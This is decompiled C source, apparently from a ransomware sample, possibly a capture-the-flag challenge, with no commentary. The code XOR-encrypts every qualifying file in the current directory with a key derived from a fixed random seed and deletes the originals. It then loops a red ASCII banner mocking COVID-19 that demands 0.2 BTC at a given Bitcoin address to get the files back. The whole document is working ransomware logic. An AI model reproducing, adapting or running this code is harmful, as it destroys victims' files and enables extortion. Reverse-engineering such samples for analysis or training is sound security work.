void main(int argc,char **argv)

{
  int iVar1;
  int iVar2;
  int iVar3;
  size_t __n;
  DIR *__dirp;
  FILE *__stream;
  FILE *__stream_00;
  dirent *pdVar4;
  long in_FS_OFFSET;
  ulong local_88;
  undefined8 local_80;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined8 local_60;
  undefined2 local_58;
  char local_48 [56];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_88 = 0x20;
  local_80 = 0;
  local_78 = 0;
  local_70 = 0;
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  srand(0xdeadbeef);
  iVar1 = rand();
  __n = strlen(*argv);
  strncpy(local_48,*argv + 2,__n);
  __dirp = opendir(".");
  if (__dirp != (DIR *)0x0) {
    while (pdVar4 = readdir(__dirp), pdVar4 != (dirent *)0x0) {
      iVar2 = strcmp(pdVar4->d_name,local_48);
      if ((iVar2 != 0) && (iVar2 = FUN_00100bca(pdVar4->d_name), iVar2 != 0)) {
        __stream = fopen(pdVar4->d_name,"rb");
        FUN_00100c30(pdVar4->d_name,&local_88);
        __stream_00 = fopen((char *)&local_88,"w");
        while (iVar2 = feof(__stream), iVar2 == 0) {
          iVar2 = _IO_getc(__stream);
          iVar3 = feof(__stream);
          if (iVar3 == 0) {
            fputc((int)(char)((byte)iVar2 ^ (byte)(iVar1 % 0xff)),__stream_00);
          }
        }
        fclose(__stream);
        remove(pdVar4->d_name);
        fclose(__stream_00);
      }
      local_88 = local_88 & 0xffffffffffffff00;
    }
    closedir(__dirp);
  }
  do {
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                                                             AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH      SO YOU THOUGHT COVID-19 IS ONLY A HUMAN\'S VIRUS?       AHAHAH AHHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                                                             AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                                                             AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH     NOW TRANSFER 0.2 BTC TO THE FOLLOWING BITCOIN ADDRESS   AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                 TO GET YOUR FILES BACK                      AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH         BTC : 1PC9aZC4hNX2rmmrt7uHTfYAS3hRbph4UN            AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAH                                                             AHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    puts(
        "\x1b[31;1m HAHAHAHHAHAHHAHAHHAHAHAHAHAHHAHAHAHAHHAHHAHAHAHAHHAHAHAHAHAAHHAHAHHAHAAHHAHAHAHA HHA \x1b[0m"
        );
    sleep(1);
    system("clear");
  } while( true );
}
